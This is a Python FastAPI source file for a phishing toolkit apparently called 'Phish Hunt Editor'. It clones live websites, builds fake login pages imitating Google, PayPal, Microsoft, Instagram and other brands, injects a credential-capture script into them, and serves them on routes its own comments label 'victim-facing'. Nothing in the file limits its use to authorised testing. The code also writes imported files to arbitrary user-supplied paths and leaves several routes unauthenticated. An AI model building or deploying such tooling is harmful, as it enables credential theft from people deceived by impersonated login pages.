import io
import json
import re
import shutil
import zipfile

from datetime import datetime
from pathlib import Path
from typing import List, Optional
from urllib.parse import urlparse

from fastapi import APIRouter, Depends, Form, HTTPException, UploadFile, File
from fastapi.responses import FileResponse, HTMLResponse, Response, StreamingResponse
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from sqlalchemy.sql import func

from config import settings
from database import get_db
from landing_pages.models import LandingPage, Flow
from auth.utils import get_current_user
from auth.models import User
from cloner import (
    CloneError,
    ImportValidationError,
    MAX_HTML_SIZE,
    DEFAULT_CAPTURE_FIELDS,
    CLONE_ASSETS_DIR,
    clone_site,
    finalize_html,
    looks_like_html,
    normalize_url,
    sanitize_html,
)

router = APIRouter(prefix="/landing-pages", tags=["landing-pages"])

_ASSET_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,120}$")

# Hand-built static login-page templates living in the Next.js public folder.
# The picker shows all entries; apps are enabled once the operator drops the
# matching file (e.g. facebook.html) into frontend/public/templates/.
TEMPLATE_CATALOG = {
    "instagram": {"file": "instagram.html", "label": "Instagram"},
    "x": {"file": "x.html", "label": "X"},
    "github": {"file": "github.html", "label": "GitHub"},
    "facebook": {"file": "facebook.html", "label": "Facebook"},
    "google": {"file": "google.html", "label": "Google"},
    "microsoft": {"file": "microsoft.html", "label": "Microsoft"},
    "netflix": {"file": "netflix.html", "label": "Netflix"},
    "paypal": {"file": "paypal.html", "label": "PayPal"},
    "tiktok": {"file": "tiktok.html", "label": "TikTok"},
    "discord": {"file": "discord.html", "label": "Discord"},
}

_FRONTEND_ROOT = Path(__file__).resolve().parent.parent.parent / "frontend"
TEMPLATES_SOURCE_DIR = _FRONTEND_ROOT / "public" / "templates"
TEMPLATES_BUILD_DIR = TEMPLATES_SOURCE_DIR / "builds"


# ============================================================
# SCHEMAS
# ============================================================

class LandingPageCreate(BaseModel):
    name: str
    html_content: str
    capture_fields: Optional[List[str]] = None
    source_url: Optional[str] = None


class LandingPageUpdate(BaseModel):
    name: str
    html_content: str
    capture_fields: Optional[List[str]] = None
    source_url: Optional[str] = None


class LandingPageImport(BaseModel):
    name: Optional[str] = None
    url: str
    capture_fields: Optional[List[str]] = None
    render: Optional[bool] = None
    prefers_dark: Optional[bool] = True


class LandingPageBuild(BaseModel):
    name: str
    template_id: str
    capture_fields: Optional[List[str]] = None


class FlowSave(BaseModel):
    nodes: List[dict] = []
    connections: List[dict] = []


class FlowResponse(BaseModel):
    id: int
    landing_page_id: int
    nodes: List[dict] = []
    connections: List[dict] = []


class LandingPageResponse(BaseModel):
    id: int
    name: str
    html_content: str
    capture_fields: Optional[str] = None
    source_url: Optional[str] = None
    import_type: Optional[str] = None
    import_status: Optional[str] = None
    error_message: Optional[str] = None
    asset_count: Optional[int] = None

    class Config:
        from_attributes = True


def _asset_dir(page_id: int) -> Path:
    return CLONE_ASSETS_DIR / str(page_id)


def _build_dir(page_id: int) -> Path:
    return TEMPLATES_BUILD_DIR / str(page_id)


def _cleanup_assets(page_id: int):
    shutil.rmtree(_asset_dir(page_id), ignore_errors=True)


def _cleanup_build(page_id: int):
    shutil.rmtree(_build_dir(page_id), ignore_errors=True)


# ============================================================
# GET LANDING PAGES
# ============================================================

@router.get("/", response_model=List[LandingPageResponse])
async def get_landing_pages(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(LandingPage))
    return result.scalars().all()


# ============================================================
# GET TEMPLATE CATALOG  (availability for the picker)
# ============================================================

@router.get("/templates", include_in_schema=False)
async def list_templates(current_user: User = Depends(get_current_user)):
    return [
        {
            "id": template_id,
            "label": meta["label"],
            "file": meta["file"],
            "available": (TEMPLATES_SOURCE_DIR / meta["file"]).is_file(),
        }
        for template_id, meta in TEMPLATE_CATALOG.items()
    ]


# ============================================================
# GET SINGLE LANDING PAGE
# ============================================================

@router.get("/{page_id}", response_model=LandingPageResponse)
async def get_landing_page(
    page_id: int,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(LandingPage).where(LandingPage.id == page_id))
    page = result.scalars().first()
    if not page:
        raise HTTPException(status_code=404, detail="Landing page not found")
    return page


# ============================================================
# CREATE
# ============================================================

@router.post("/", response_model=LandingPageResponse)
async def create_landing_page(
    page: LandingPageCreate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    fields = page.capture_fields or DEFAULT_CAPTURE_FIELDS

    if not looks_like_html(page.html_content):
        raise HTTPException(status_code=400, detail="The supplied content is not valid HTML.")

    new_page = LandingPage(
        name=page.name,
        html_content="<!DOCTYPE html><html><body><p>Processing...</p></body></html>",
        capture_fields=json.dumps(fields),
        source_url=page.source_url,
        import_type="html",
        import_status="ready",
    )
    db.add(new_page)
    await db.commit()
    await db.refresh(new_page)

    new_page.html_content = finalize_html(
        page.html_content, fields, new_page.id, strip_scripts=False
    )
    new_page.updated_at = func.now()
    await db.commit()
    await db.refresh(new_page)
    return new_page


# ============================================================
# UPDATE
# ============================================================

@router.put("/{page_id}", response_model=LandingPageResponse)
async def update_landing_page(
    page_id: int,
    page: LandingPageUpdate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(LandingPage).where(LandingPage.id == page_id))
    existing = result.scalars().first()
    if not existing:
        raise HTTPException(status_code=404, detail="Landing page not found")

    if not looks_like_html(page.html_content):
        raise HTTPException(status_code=400, detail="The supplied content is not valid HTML.")

    fields = page.capture_fields or DEFAULT_CAPTURE_FIELDS

    existing.name = page.name
    existing.html_content = finalize_html(
        page.html_content, fields, existing.id, strip_scripts=False
    )
    existing.capture_fields = json.dumps(fields)
    existing.source_url = page.source_url
    existing.updated_at = func.now()

    await db.commit()
    await db.refresh(existing)
    return existing


# ============================================================
# DELETE
# ============================================================

@router.delete("/{page_id}")
async def delete_landing_page(
    page_id: int,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(LandingPage).where(LandingPage.id == page_id))
    existing = result.scalars().first()
    if not existing:
        raise HTTPException(status_code=404, detail="Landing page not found")

    await db.delete(existing)
    await db.commit()
    _cleanup_assets(page_id)
    _cleanup_build(page_id)
    return {"message": "Landing page deleted successfully"}


# ============================================================
# IMPORT / CLONE FROM URL (server-side, no CORS)
# ============================================================

@router.post("/import", response_model=LandingPageResponse)
async def import_landing_page(
    page: LandingPageImport,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    allowed_domains = settings.ALLOWED_IMPORT_DOMAINS or ""

    try:
        normalized_url = normalize_url(page.url)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    capture_fields = page.capture_fields or DEFAULT_CAPTURE_FIELDS
    force_render = page.render if page.render is not None else True

    hostname = urlparse(normalized_url).hostname or "Imported Website"
    name = page.name or f"{hostname} Imported Page"

    new_page = LandingPage(
        name=name,
        html_content="<!DOCTYPE html><html><body><p>Processing...</p></body></html>",
        capture_fields=json.dumps(capture_fields),
        source_url=normalized_url,
        import_type="url",
        import_status="importing",
    )
    db.add(new_page)
    await db.commit()
    await db.refresh(new_page)

    try:
        clone_result = await clone_site(
            normalized_url,
            capture_fields,
            new_page.id,
            force_render=force_render,
            allowed_domains=allowed_domains,
            prefers_dark=page.prefers_dark if page.prefers_dark is not None else True,
        )
    except (CloneError, ImportValidationError) as exc:
        new_page.import_status = "error"
        new_page.error_message = str(exc)
        new_page.updated_at = func.now()
        await db.commit()
        await db.refresh(new_page)
        raise HTTPException(status_code=400, detail=str(exc))
    except Exception as exc:
        new_page.import_status = "error"
        new_page.error_message = str(exc)
        new_page.updated_at = func.now()
        await db.commit()
        await db.refresh(new_page)
        raise HTTPException(status_code=500, detail=f"Cloning failed: {exc}")

    new_page.html_content = clone_result.html
    new_page.asset_count = clone_result.asset_count
    new_page.import_status = "ready"
    new_page.updated_at = func.now()

    if clone_result.failed_assets:
        new_page.error_message = (
            f"Imported successfully with {len(clone_result.failed_assets)} "
            f"missing asset(s)."
        )

    await db.commit()
    await db.refresh(new_page)
    return new_page


# ============================================================
# UPLOAD HTML FILE
# ============================================================

@router.post("/upload", response_model=LandingPageResponse)
async def upload_landing_page(
    file: UploadFile = File(...),
    name: Optional[str] = None,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    filename = file.filename or ""
    if not filename.lower().endswith((".html", ".htm")):
        raise HTTPException(status_code=400, detail="Only .html and .htm files are supported.")

    content = await file.read()
    if not content:
        raise HTTPException(status_code=400, detail="The HTML file is empty.")

    if len(content) > MAX_HTML_SIZE:
        raise HTTPException(status_code=413, detail="HTML file is too large. Maximum size is 10 MB.")

    try:
        html_content = content.decode("utf-8")
    except UnicodeDecodeError:
        html_content = content.decode("latin-1", errors="replace")

    html_content = sanitize_html(html_content)
    if not looks_like_html(html_content):
        raise HTTPException(status_code=400, detail="The uploaded file does not appear to contain normal HTML.")

    capture_fields = DEFAULT_CAPTURE_FIELDS.copy()

    page_name = (
        name.strip()
        if name and name.strip()
        else filename.rsplit(".", 1)[0]
    )

    new_page = LandingPage(
        name=page_name,
        html_content="<!DOCTYPE html><html><body><p>Processing...</p></body></html>",
        capture_fields=json.dumps(capture_fields),
        source_url=None,
        import_type="upload",
        import_status="ready",
    )
    db.add(new_page)
    await db.commit()
    await db.refresh(new_page)

    new_page.html_content = finalize_html(
        html_content, capture_fields, new_page.id, strip_scripts=False
    )
    new_page.updated_at = func.now()
    await db.commit()
    await db.refresh(new_page)
    return new_page


# ============================================================
# BUILD FROM TEMPLATE  (copy -> public/templates/builds/<id> -> save)
# ============================================================

@router.post("/build", response_model=LandingPageResponse)
async def build_landing_page(
    payload: LandingPageBuild,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    template = TEMPLATE_CATALOG.get(payload.template_id)
    if not template:
        raise HTTPException(status_code=400, detail="Unknown template.")

    src = TEMPLATES_SOURCE_DIR / template["file"]
    if not src.is_file():
        raise HTTPException(
            status_code=400,
            detail=(
                f"The '{template['label']}' template is not added yet. "
                f"Drop '{template['file']}' into frontend/public/templates/ to enable it."
            ),
        )

    raw = src.read_text("utf-8", errors="replace")
    if not looks_like_html(raw):
        raise HTTPException(status_code=400, detail="Invalid template file.")

    fields = payload.capture_fields or DEFAULT_CAPTURE_FIELDS
    page_name = (
        payload.name.strip()
        if payload.name and payload.name.strip()
        else f"{template['label']} Login Page"
    )

    new_page = LandingPage(
        name=page_name,
        html_content="<!DOCTYPE html><html><body><p>Processing...</p></body></html>",
        capture_fields=json.dumps(fields),
        source_url=f"template:{payload.template_id}",
        import_type="template",
        import_status="ready",
    )
    db.add(new_page)
    await db.commit()
    await db.refresh(new_page)

    finalized = finalize_html(
        raw, fields, new_page.id, strip_scripts=False, button_capture=True
    )

    # Copy the template into a per-page build folder and persist the edited
    # copy there. The original template file is never modified.
    build_dir = _build_dir(new_page.id)
    build_dir.mkdir(parents=True, exist_ok=True)
    (build_dir / template["file"]).write_text(finalized, "utf-8")

    new_page.html_content = finalized
    new_page.updated_at = func.now()
    await db.commit()
    await db.refresh(new_page)
    return new_page


# ============================================================
# DOWNLOAD PAGE (HTML or ZIP archive)
# ============================================================

@router.get("/{page_id}/download", include_in_schema=False)
async def download_landing_page(
    page_id: int,
    format: str = "html",
    db: AsyncSession = Depends(get_db),
):
    result = await db.execute(select(LandingPage).where(LandingPage.id == page_id))
    page = result.scalars().first()
    if not page:
        raise HTTPException(status_code=404, detail="Landing page not found")

    safe_name = re.sub(r"[^A-Za-z0-9._-]", "_", page.name)

    if format == "zip":
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("index.html", page.html_content or "")
            asset_root = _asset_dir(page_id)
            if asset_root.is_dir():
                for asset_file in sorted(asset_root.rglob("*")):
                    if asset_file.is_file():
                        rel = f"assets/{asset_file.relative_to(asset_root)}"
                        zf.writestr(rel, asset_file.read_bytes())
        buf.seek(0)
        return StreamingResponse(
            buf,
            media_type="application/zip",
            headers={"Content-Disposition": f'attachment; filename="{safe_name}.zip"'},
        )

    return HTMLResponse(
        content=page.html_content or "",
        headers={"Content-Disposition": f'attachment; filename="{safe_name}.html"'},
    )


# ============================================================
# SERVE CLONED PAGE  (public — victim-facing)
# ============================================================

@router.get("/{page_id}/page", include_in_schema=False)
async def serve_page(
    page_id: int,
    db: AsyncSession = Depends(get_db),
):
    result = await db.execute(select(LandingPage).where(LandingPage.id == page_id))
    page = result.scalars().first()
    if not page:
        raise HTTPException(status_code=404, detail="Landing page not found")
    return HTMLResponse(content=page.html_content)


# ============================================================
# SERVE CLONED ASSETS  (public — victim-facing)
# ============================================================

@router.get("/clone-assets/{page_id}/{filename}", include_in_schema=False)
async def serve_clone_asset(page_id: int, filename: str):
    if not _ASSET_NAME_RE.fullmatch(filename):
        raise HTTPException(status_code=400, detail="Invalid asset name.")
    path = _asset_dir(page_id) / filename
    if not path.is_file():
        raise HTTPException(status_code=404, detail="Asset not found.")
    return FileResponse(
        path,
        headers={
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET",
            "Cache-Control": "public, max-age=31536000, immutable",
        },
    )


# ============================================================
# VISUAL FLOW EDITOR STATE
# ============================================================

@router.get("/{page_id}/flow", response_model=FlowResponse, include_in_schema=False)
async def get_flow(
    page_id: int,
    db: AsyncSession = Depends(get_db),
):
    result = await db.execute(select(Flow).where(Flow.landing_page_id == page_id))
    flow = result.scalars().first()
    if not flow:
        return {
            "id": 0,
            "landing_page_id": page_id,
            "nodes": [],
            "connections": [],
        }

    def _load(raw: Optional[str]):
        if not raw:
            return []
        try:
            value = json.loads(raw)
            return value if isinstance(value, list) else []
        except Exception:
            return []

    return {
        "id": flow.id,
        "landing_page_id": flow.landing_page_id,
        "nodes": _load(flow.nodes),
        "connections": _load(flow.connections),
    }


@router.put("/{page_id}/flow", response_model=FlowResponse)
async def save_flow(
    page_id: int,
    payload: FlowSave,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(LandingPage).where(LandingPage.id == page_id))
    page = result.scalars().first()
    if not page:
        raise HTTPException(status_code=404, detail="Landing page not found")

    result = await db.execute(select(Flow).where(Flow.landing_page_id == page_id))
    flow = result.scalars().first()

    if flow:
        flow.nodes = json.dumps(payload.nodes)
        flow.connections = json.dumps(payload.connections)
        flow.updated_at = func.now()
    else:
        flow = Flow(
            landing_page_id=page_id,
            nodes=json.dumps(payload.nodes),
            connections=json.dumps(payload.connections),
        )
        db.add(flow)

    await db.commit()
    await db.refresh(flow)

    return {
        "id": flow.id,
        "landing_page_id": page_id,
        "nodes": payload.nodes,
        "connections": payload.connections,
    }


# ============================================================
# .PHE EXPORT / IMPORT  (Phish Hunt Editor — shareable project files)
# ============================================================

# The injected credential-capture script bakes the ORIGINAL page id into the
# html; strip it on export so the .phe is id-agnostic. Import re-injects a
# fresh capture script bound to the NEW page id.
_CAPTURE_SCRIPT_RE = re.compile(
    r'<script data-phishhunt="capture">[\s\S]*?</script>', re.IGNORECASE
)

PHE_FORMAT = "phe"
PHE_VERSION = 1


def _strip_capture_script(html: str) -> str:
    return _CAPTURE_SCRIPT_RE.sub("", html or "")


def _safe_filename_part(text: str) -> str:
    part = re.sub(r"[^A-Za-z0-9._ -]+", "_", (text or "").strip())
    part = re.sub(r"\s+", "-", part).strip("-._")
    return part[:60] or "page"


def _slugify_file_name(text: str) -> str:
    name = re.sub(r"[^A-Za-z0-9._ -]+", "-", (text or "").strip())
    name = re.sub(r"-{2,}", "-", name).strip("-")
    return name[:80] or "page"


@router.get("/{page_id}/export-phe")
async def export_phe(
    page_id: int,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    """Compile the WHOLE visual-editor state of a page into one shareable
    .phe file (plain JSON): the starting page html, every New Page's
    self-contained html, all panel positions/sizes/ratios, notes, url/capture
    panels, button strings/locks and all Dynamic Fetching marks & pipes."""
    result = await db.execute(select(LandingPage).where(LandingPage.id == page_id))
    page = result.scalars().first()
    if not page:
        raise HTTPException(status_code=404, detail="Landing page not found")

    flow_result = await db.execute(select(Flow).where(Flow.landing_page_id == page_id))
    flow = flow_result.scalars().first()

    nodes: List[dict] = []
    connections: List[dict] = []
    if flow and flow.nodes:
        try:
            nodes = json.loads(flow.nodes) or []
            connections = json.loads(flow.connections) or []
        except Exception:
            nodes, connections = [], []

    try:
        capture_fields = json.loads(page.capture_fields) if page.capture_fields else []
    except Exception:
        capture_fields = []

    phe = {
        "format": PHE_FORMAT,
        "version": PHE_VERSION,
        "exported_at": datetime.utcnow().isoformat(),
        "page": {
            "name": page.name,
            "capture_fields": capture_fields,
            "html": _strip_capture_script(page.html_content or ""),
        },
        "flow": {"nodes": nodes, "connections": connections},
    }

    payload = json.dumps(phe, ensure_ascii=False).encode("utf-8")
    filename = f"{_slugify_file_name(page.name)}.phe"
    return Response(
        content=payload,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


class PheImportResult(BaseModel):
    page: LandingPageResponse
    extracted_files: List[str]
    extract_dir: str


@router.post("/import-phe", response_model=PheImportResult)
async def import_phe(
    file: UploadFile = File(...),
    folder_path: str = Form(""),
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    """Import a .phe project file:
    1. extract every page's .html (starting page + New Pages) into the local
       folder the user typed (created when missing),
    2. recreate the landing page + flow so the Visual Editor opens identical
       to the moment of export."""
    raw = await file.read()
    if not raw:
        raise HTTPException(status_code=400, detail="The .phe file is empty.")

    try:
        phe = json.loads(raw.decode("utf-8"))
    except Exception:
        raise HTTPException(status_code=400, detail="The file is not a valid .phe project.")

    if not isinstance(phe, dict) or phe.get("format") != PHE_FORMAT:
        raise HTTPException(status_code=400, detail="This file is not a Phish Hunt Editor (.phe) project.")
    if phe.get("version") != PHE_VERSION:
        raise HTTPException(status_code=400, detail=f"Unsupported .phe version: {phe.get('version')}")

    phe_page = phe.get("page") or {}
    phe_flow = phe.get("flow") or {}
    html = _strip_capture_script(phe_page.get("html") or "")
    if not html or not looks_like_html(html):
        raise HTTPException(status_code=400, detail="The .phe does not contain a valid starting page.")

    nodes = phe_flow.get("nodes") or []
    connections = phe_flow.get("connections") or []
    if not isinstance(nodes, list) or not isinstance(connections, list):
        raise HTTPException(status_code=400, detail="The .phe flow is malformed.")

    capture_fields = phe_page.get("capture_fields") or DEFAULT_CAPTURE_FIELDS.copy()
    page_name = (phe_page.get("name") or "").strip() or "Imported .phe project"

    # ── 1) create the landing page (fresh id) and re-bind the capture script ──
    new_page = LandingPage(
        name=page_name,
        html_content="<!DOCTYPE html><html><body><p>Processing...</p></body></html>",
        capture_fields=json.dumps(capture_fields),
        source_url=None,
        import_type="phe",
        import_status="ready",
    )
    db.add(new_page)
    await db.commit()
    await db.refresh(new_page)

    new_page.html_content = finalize_html(
        sanitize_html(html), capture_fields, new_page.id, strip_scripts=False
    )
    new_page.updated_at = func.now()
    await db.commit()
    await db.refresh(new_page)

    # ── 2) save the flow verbatim — panels, positions, notes, urls, strings, DF ──
    flow = Flow(
        landing_page_id=new_page.id,
        nodes=json.dumps(nodes),
        connections=json.dumps(connections),
    )
    db.add(flow)
    await db.commit()
    await db.refresh(flow)

    # ── 3) decompile: write every page's html into the user's folder ──
    extracted_files: List[str] = []
    extract_dir = ""
    
    target_path_str = folder_path.strip() if folder_path and folder_path.strip() else str(Path(__file__).resolve().parent.parent.parent / "extracted_pages" / _slugify_file_name(page_name))
    target_dir = Path(target_path_str)
    
    try:
        target_dir.mkdir(parents=True, exist_ok=True)
    except Exception as exc:
        raise HTTPException(
            status_code=400,
            detail=f"Cannot create folder '{target_path_str}': {exc}",
        )
    extract_dir = str(target_dir)

    pages_out: List[tuple[str, str]] = [
        (f"01-{_safe_filename_part(new_page.name)}", new_page.html_content or "")
    ]
    index = 2
    for node in nodes:
        if not isinstance(node, dict):
            continue
        if node.get("type") != "new_page":
            continue
        label = _safe_filename_part(str((node.get("data") or {}).get("label") or f"new-page-{index}"))
        node_html = str((node.get("data") or {}).get("htmlContent") or "")
        if not node_html:
            continue
        pages_out.append((f"{index:02d}-{label}", node_html))
        index += 1

    for file_title, file_html in pages_out:
        out_path = target_dir / f"{file_title}.html"
        try:
            out_path.write_text(file_html, encoding="utf-8")
            extracted_files.append(out_path.name)
        except Exception as exc:
            raise HTTPException(
                status_code=400,
                detail=f"Failed to write '{out_path}': {exc}",
            )

    return {
        "page": {
            "id": new_page.id,
            "name": new_page.name,
            "html_content": new_page.html_content,
            "capture_fields": new_page.capture_fields,
            "source_url": new_page.source_url,
            "import_type": new_page.import_type,
            "import_status": new_page.import_status,
            "error_message": new_page.error_message,
            "asset_count": new_page.asset_count,
        },
        "extracted_files": extracted_files,
        "extract_dir": extract_dir,
    }


# ============================================================
# Default template seeding (fresh repos)
# ============================================================
# Every *.phe file inside backend/seed/ is installed as a built-in template on
# the very first start of the app, i.e. only when the landing_pages table is
# still empty. That is what makes the shipped flow appear as template #0 in a
# fresh clone — and, because the seeding never runs again afterwards, the
# operator remains free to delete it without it resurrecting on restart.
PHE_SEED_DIR = Path(__file__).resolve().parent.parent / "seed"


async def seed_phe_templates(db: AsyncSession):
    seed_dir = PHE_SEED_DIR
    if not seed_dir.is_dir():
        return
    seed_files = sorted(seed_dir.glob("*.phe"))
    if not seed_files:
        return

    existing = await db.execute(select(LandingPage))
    if existing.scalars().first() is not None:
        return  # app already has data — seeding only happens on a fresh install

    for seed_path in seed_files:
        try:
            phe = json.loads(seed_path.read_bytes().decode("utf-8"))
        except Exception:
            continue  # malformed seed file — skip without breaking startup
        if not isinstance(phe, dict) or phe.get("format") != PHE_FORMAT:
            continue
        if phe.get("version") != PHE_VERSION:
            continue
        phe_page = phe.get("page") or {}
        phe_flow = phe.get("flow") or {}
        html = phe_page.get("html") or ""
        if not html or not looks_like_html(html):
            continue
        nodes = phe_flow.get("nodes") or []
        connections = phe_flow.get("connections") or []
        if not isinstance(nodes, list) or not isinstance(connections, list):
            continue

        capture_fields = phe_page.get("capture_fields") or DEFAULT_CAPTURE_FIELDS.copy()
        page_name = (phe_page.get("name") or "").strip() or "Starter template"

        new_page = LandingPage(
            name=page_name,
            html_content="<!DOCTYPE html><html><body><p>Processing...</p></body></html>",
            capture_fields=json.dumps(capture_fields),
            source_url=None,
            import_type="phe",
            import_status="ready",
        )
        db.add(new_page)
        await db.commit()
        await db.refresh(new_page)

        new_page.html_content = finalize_html(
            sanitize_html(html), capture_fields, new_page.id, strip_scripts=False
        )
        new_page.updated_at = func.now()
        await db.commit()

        db.add(Flow(
            landing_page_id=new_page.id,
            nodes=json.dumps(nodes),
            connections=json.dumps(connections),
        ))
        await db.commit()
